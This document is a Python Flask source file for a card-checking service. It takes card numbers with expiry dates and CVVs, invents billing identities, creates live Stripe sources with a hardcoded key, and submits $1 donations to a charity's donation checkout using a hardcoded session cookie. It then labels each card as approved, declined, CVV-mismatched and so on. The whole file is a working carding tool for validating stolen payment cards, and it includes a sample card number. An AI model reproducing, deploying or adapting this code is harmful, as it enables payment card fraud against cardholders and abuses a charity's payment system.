import requests
import random
import json
import re
import time
from datetime import datetime
from typing import Dict, Tuple, Optional, Any
from flask import Flask, request, jsonify
import threading
import os

app = Flask(__name__)

class StripeChargeAPI:
    def __init__(self):
        self.state_abbreviations = {
            'alabama': 'AL', 'alaska': 'AK', 'arizona': 'AZ', 'arkansas': 'AR',
            'california': 'CA', 'colorado': 'CO', 'connecticut': 'CT', 'delaware': 'DE',
            'florida': 'FL', 'georgia': 'GA', 'hawaii': 'HI', 'idaho': 'ID',
            'illinois': 'IL', 'indiana': 'IN', 'iowa': 'IA', 'kansas': 'KS',
            'kentucky': 'KY', 'louisiana': 'LA', 'maine': 'ME', 'maryland': 'MD',
            'massachusetts': 'MA', 'michigan': 'MI', 'minnesota': 'MN', 'mississippi': 'MS',
            'missouri': 'MO', 'montana': 'MT', 'nebraska': 'NE', 'nevada': 'NV',
            'new hampshire': 'NH', 'new jersey': 'NJ', 'new mexico': 'NM', 'new york': 'NY',
            'north carolina': 'NC', 'north dakota': 'ND', 'ohio': 'OH', 'oklahoma': 'OK',
            'oregon': 'OR', 'pennsylvania': 'PA', 'rhode island': 'RI', 'south carolina': 'SC',
            'south dakota': 'SD', 'tennessee': 'TN', 'texas': 'TX', 'utah': 'UT',
            'vermont': 'VT', 'virginia': 'VA', 'washington': 'WA', 'west virginia': 'WV',
            'wisconsin': 'WI', 'wyoming': 'WY',
            'district of columbia': 'DC', 'guam': 'GU', 'american samoa': 'AS',
            'northern mariana islands': 'MP', 'puerto rico': 'PR', 'virgin islands': 'VI'
        }
        
        self.email_domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
        
        # Response messages mapping
        self.response_messages = {
            'APPROVED': 'Your transaction has been approved successfully.',
            'CCN/CVV': 'Card verification failed. Please check your card details.',
            '3D LIVE': '3D Secure authentication required.',
            'INSUFFICIENT FUNDS': 'Insufficient funds. Please use a different payment method.',
            'STRIPE AUTH': 'Authorization required. Please complete authentication.',
            'DECLINED': 'Your transaction has been declined.',
            'UNKNOWN': 'An unknown error occurred. Please try again later.'
        }
    
    def parse_card_input(self, card_input: str) -> Dict:
        """Parse card input in various formats"""
        card_input = card_input.strip()
        
        # Handle different formats
        if '|' in card_input:
            parts = card_input.split('|')
        elif '/' in card_input:
            parts = card_input.split('/')
        elif ' ' in card_input:
            parts = card_input.split()
        else:
            # Try to parse based on length
            if len(card_input) >= 16:
                parts = [
                    card_input[:16],
                    card_input[16:18] if len(card_input) > 18 else '',
                    card_input[18:20] if len(card_input) > 20 else '',
                    card_input[20:] if len(card_input) > 20 else ''
                ]
            else:
                raise ValueError("Invalid card format")
        
        if len(parts) < 4:
            raise ValueError("Invalid card format. Use: ccn|mm|yy|cvv")
        
        ccn = parts[0].strip()
        mm = parts[1].strip() if len(parts) > 1 else ''
        yy = parts[2].strip() if len(parts) > 2 else ''
        cvv = parts[3].strip() if len(parts) > 3 else ''
        
        # Clean card number
        ccn = re.sub(r'\D', '', ccn)
        
        if not ccn or len(ccn) < 15:
            raise ValueError("Invalid card number")
        
        # Handle month
        if not mm or not mm.isdigit():
            mm = str(random.randint(1, 12))
        
        # Handle year
        if not yy or not yy.isdigit():
            current_year = datetime.now().year % 100
            yy = str(random.randint(current_year, current_year + 5))
        
        if len(yy) == 4:
            yy = yy[2:]
        elif len(yy) != 2:
            yy = str(random.randint(23, 28))
        
        # Handle CVV
        if not cvv or not cvv.isdigit():
            cvv = str(random.randint(100, 999))
        
        return {
            'ccn': ccn,
            'mm': mm.zfill(2),
            'yy': yy,
            'cvv': cvv
        }
    
    def get_bin_info(self, card_number: str) -> Optional[Dict]:
        """Get BIN information from antipublic API"""
        try:
            # Get first 6 digits for BIN lookup
            bin_number = card_number[:6]
            url = f"https://bins.antipublic.cc/bins/{bin_number}"
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            response = requests.get(url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                return response.json()
            else:
                return None
                
        except Exception as e:
            print(f"Error fetching BIN info: {e}")
            return None
    
    def get_random_user_info(self, bin_info: Optional[Dict] = None) -> Dict:
        """Fetch random user info from API"""
        try:
            # Use randomuser.me API
            nat = 'us'
            if bin_info and 'country' in bin_info:
                country_code = bin_info['country'].lower()
                # Map common country codes
                country_map = {
                    'us': 'us', 'gb': 'gb', 'ca': 'ca', 'au': 'au',
                    'de': 'de', 'fr': 'fr', 'it': 'it', 'es': 'es',
                    'br': 'br', 'mx': 'mx', 'in': 'in', 'jp': 'jp'
                }
                if country_code in country_map:
                    nat = country_map[country_code]
                elif len(country_code) == 2:
                    # Try with the country code
                    nat = country_code
            
            response = requests.get(f'https://randomuser.me/api/?nat={nat}')
            data = response.json()
            user = data['results'][0]
            
            # Format email
            first_name = user['name']['first'].lower()
            last_name = user['name']['last'].lower()
            domain = random.choice(self.email_domains)
            email = f"{first_name}.{last_name}@{domain}"
            
            # Format phone
            phone = re.sub(r'\D', '', user['phone'])
            
            # Get state/region
            if nat == 'us':
                state_name = user['location']['state'].lower()
                state_abbr = self.state_abbreviations.get(state_name, 'NY')
            else:
                state_abbr = user['location']['state'][:2].upper() if len(user['location']['state']) >= 2 else 'NY'
            
            return {
                'member_first_name': user['name']['first'],
                'member_last_name': user['name']['last'],
                'billing_first_name': user['name']['first'],
                'billing_last_name': user['name']['last'],
                'member_name': f"{user['name']['first']} {user['name']['last']}",
                'billing_address1': f"{user['location']['street']['number']} {user['location']['street']['name']}",
                'billing_city': user['location']['city'],
                'billing_state': state_abbr,
                'billing_postal_code': str(user['location']['postcode']),
                'billing_country': user['nat'].upper(),
                'member_email_address': email,
                'member_phone': phone,
                'nat': user['nat']
            }
            
        except Exception as e:
            print(f"Error fetching random user: {e}")
            return self.get_default_user_info(bin_info)
    
    def get_default_user_info(self, bin_info: Optional[Dict] = None) -> Dict:
        """Provide default user info"""
        country = 'US'
        city = 'New York'
        state = 'NY'
        
        if bin_info and 'country' in bin_info:
            country = bin_info['country']
            if country == 'GB':
                city = 'London'
                state = 'LN'
            elif country == 'CA':
                city = 'Toronto'
                state = 'ON'
            elif country == 'AU':
                city = 'Sydney'
                state = 'NSW'
        
        return {
            'member_first_name': 'David',
            'member_last_name': 'Aloysius',
            'billing_first_name': 'David',
            'billing_last_name': 'Aloysius',
            'member_name': 'David Aloysius',
            'billing_address1': 'Mall Rd, Library Msll Rd',
            'billing_city': city,
            'billing_state': state,
            'billing_postal_code': '10080',
            'billing_country': country,
            'member_email_address': 'thebrokenfuxker@gmail.com',
            'member_phone': '9042252059',
            'nat': country
        }
    
    def create_stripe_source(self, card_info: Dict, user_info: Dict) -> Optional[Dict]:
        """Create Stripe source with card details"""
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        guid = f"{random.getrandbits(128):032x}"
        muid = f"{random.getrandbits(128):032x}"
        sid = f"{random.getrandbits(128):032x}"
        
        data = {
            'type': 'card',
            'card[number]': card_info['ccn'],
            'card[cvc]': card_info['cvv'],
            'card[exp_month]': card_info['mm'],
            'card[exp_year]': f"20{card_info['yy']}",
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'payment_user_agent': 'stripe.js/1.0',
            'time_on_page': str(random.randint(10000, 30000)),
            'key': 'pk_live_h5ocNWNpicLCfBJvLialXsb900SaJnJscz'
        }
        
        try:
            response = requests.post(
                'https://api.stripe.com/v1/sources',
                headers=headers,
                data=data,
                timeout=30
            )
            
            if response.status_code == 200:
                return response.json()
            else:
                print(f"Stripe response: {response.status_code} - {response.text[:200]}")
                return None
                
        except Exception as e:
            print(f"Error creating Stripe source: {e}")
            return None
    
    def make_donation(self, stripe_source: Dict, user_info: Dict) -> requests.Response:
        """Make donation with Stripe source"""
        cookies = {
            'connect.sid': 's%3AjgaYr-ih0CCISD0HY6tHLgh1CLRTi2_n.Mwlls%2B43ueFQnoL8gTPiC25aNdpXOsmUSQCZ9VhN2s0',
            '__stripe_mid': f"{random.getrandbits(128):032x}",
            '__stripe_sid': f"{random.getrandbits(128):032x}",
        }
        
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://donate.wck.org',
            'referer': 'https://donate.wck.org/give/312884/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        # Generate a realistic-looking token
        token_parts = []
        for _ in range(10):
            token_parts.append(f"{random.getrandbits(256):064x}")
        token = '-'.join(token_parts)
        
        json_data = {
            'payment': {
                'raw_currency_code': 'USD',
                'stripe': {
                    'status': 'ready',
                    'source': {
                        'id': stripe_source['id'],
                        'object': 'source',
                        'card': {
                            'brand': stripe_source['card']['brand'],
                            'exp_month': stripe_source['card']['exp_month'],
                            'exp_year': stripe_source['card']['exp_year'],
                            'last4': stripe_source['card']['last4'],
                        },
                        'client_secret': stripe_source['client_secret'],
                        'created': stripe_source['created'],
                        'livemode': True,
                        'status': 'chargeable',
                        'type': 'card',
                    },
                },
                'method': 'Stripe',
            },
            'frequency': 'one-time',
            'items': [{
                'type': 'donation',
                'product_name': 'Donation',
                'raw_final_price': 1,
            }],
            'billing_address1': user_info['billing_address1'],
            'billing_city': user_info['billing_city'],
            'billing_state': user_info['billing_state'],
            'billing_postal_code': user_info['billing_postal_code'],
            'billing_country': user_info['billing_country'],
            'member_name': user_info['member_name'],
            'member_email_address': user_info['member_email_address'],
            'member_phone': user_info['member_phone'],
            'is_anonymous': False,
            'opt_in': True,
            'application_id': '11153',
            'billing_first_name': user_info['billing_first_name'],
            'billing_last_name': user_info['billing_last_name'],
            'member_first_name': user_info['member_first_name'],
            'member_last_name': user_info['member_last_name'],
            'token': token,
        }
        
        try:
            response = requests.post(
                'https://donate.wck.org/frs-api/campaign/312884/checkout',
                cookies=cookies,
                headers=headers,
                json=json_data,
                timeout=30
            )
            return response
        except Exception as e:
            print(f"Error making donation: {e}")
            # Return a mock response for testing
            return type('Response', (), {
                'status_code': 400,
                'text': '{"error": "Network error"}'
            })()
    
    def categorize_response(self, response_text: str) -> Tuple[str, str]:
        """Categorize response"""
        response = response_text.lower()
        
        approved_keywords = [
            "succeeded", "payment-success", "successfully", "thank you for your support",
            "your card does not support this type of purchase", "thank you",
            "membership confirmation", "thank you for your payment",
            "payment received", "your order has been received",
            "purchase successful", "approved"
        ]
        
        insufficient_keywords = [
            "insufficient funds", "insufficient_funds"
        ]
        
        auth_keywords = [
            "mutation_ok_result", "requires_action"
        ]

        ccn_cvv_keywords = [
            "incorrect_cvc", "invalid cvc", "invalid_cvc", "incorrect cvc", "incorrect cvv",
            "incorrect_cvv", "invalid_cvv", "invalid cvv", "cvc_check",
            "security code is invalid", "security code is incorrect",
            "zip code is incorrect", "zip code is invalid"
        ]

        live_keywords = [
            "authentication required", "three_d_secure", "3d secure", "stripe_3ds2_fingerprint"
        ]
        
        declined_keywords = [
            "declined", "invalid", "failed", "error", "incorrect", "do_not_honor",
            "card_declined", "transaction_not_permitted"
        ]

        if any(kw in response for kw in approved_keywords):
            return "APPROVED"
        elif any(kw in response for kw in ccn_cvv_keywords):
            return "CCN/CVV"
        elif any(kw in response for kw in live_keywords):
            return "3D LIVE"
        elif any(kw in response for kw in insufficient_keywords):
            return "INSUFFICIENT FUNDS"
        elif any(kw in response for kw in auth_keywords):
            return "STRIPE AUTH"
        elif any(kw in response for kw in declined_keywords):
            return "DECLINED"
        else:
            return "UNKNOWN"
    
    def format_message(self, status: str) -> str:
        """Format response message based on status"""
        return self.response_messages.get(status, "An error occurred while processing your request.")

# Initialize the StripeChargeAPI
stripe_api = StripeChargeAPI()

@app.route('/')
def home():
    return jsonify({
        'status': 'online',
        'service': 'Stripe Charge $1 API',
        'endpoints': {
            '/onedollar': 'Process card donations',
            '/health': 'Health check endpoint',
            '/': 'This information page'
        },
        'usage': 'GET /onedollar?chg=4777920800183271|03|29|752'
    })

@app.route('/health')
def health():
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'service': 'stripe-charge-api'
    })

@app.route('/onedollar')
def process_card():
    """Process card donation endpoint"""
    start_time = time.time()
    
    # Get card parameter
    card_input = request.args.get('chg', '').strip()
    
    if not card_input:
        return jsonify({
            'status': 'error',
            'message': 'No card provided. Use ?chg=CCN|MM|YY|CVV',
            'usage': '/onedollar?chg=4777920800183271|03|29|752'
        }), 400
    
    try:
        # Parse card info
        card_info = stripe_api.parse_card_input(card_input)
        
        # Get BIN information
        bin_info = stripe_api.get_bin_info(card_info['ccn'])
        
        # Get user info based on BIN
        user_info = stripe_api.get_random_user_info(bin_info)
        
        # Create Stripe source
        stripe_source = stripe_api.create_stripe_source(card_info, user_info)
        
        if not stripe_source:
            return jsonify({
                'status': 'error',
                'message': 'Failed to create payment source',
                'bin_info': bin_info if bin_info else 'BIN lookup failed',
                'card': {
                    'number': f"************{card_info['ccn'][-4:]}",
                    'expiry': f"{card_info['mm']}/{card_info['yy']}",
                    'brand': 'Unknown'
                }
            }), 500
        
        # Make donation
        response = stripe_api.make_donation(stripe_source, user_info)
        
        # Categorize response
        status = stripe_api.categorize_response(response.text)
        formatted_message = stripe_api.format_message(status)
        
        # Prepare response
        response_data = {
            'status': status,
            'message': formatted_message,
            'processing_time': round(time.time() - start_time, 2),
            'card': {
                'number': f"************{card_info['ccn'][-4:]}",
                'expiry': f"{card_info['mm']}/{card_info['yy']}",
                'brand': stripe_source.get('card', {}).get('brand', 'Unknown')
            },
            'bin_info': bin_info if bin_info else {},
            'transaction': {
                'amount': 1,
                'currency': 'USD',
                'timestamp': datetime.now().isoformat()
            }
        }
        
        # Add emoji based on status
        emoji_map = {
            'APPROVED': '🔥',
            'CCN/CVV': '✅',
            '3D LIVE': '✅',
            'INSUFFICIENT FUNDS': '💰',
            'STRIPE AUTH': '✅️',
            'DECLINED': '❌',
            'UNKNOWN': '❓'
        }
        
        response_data['emoji'] = emoji_map.get(status, '❓')
        
        return jsonify(response_data)
        
    except ValueError as e:
        return jsonify({
            'status': 'error',
            'message': str(e),
            'suggested_format': 'CCN|MM|YY|CVV or CCN/MM/YY/CVV'
        }), 400
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Internal server error: {str(e)}'
        }), 500

# Run the app
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
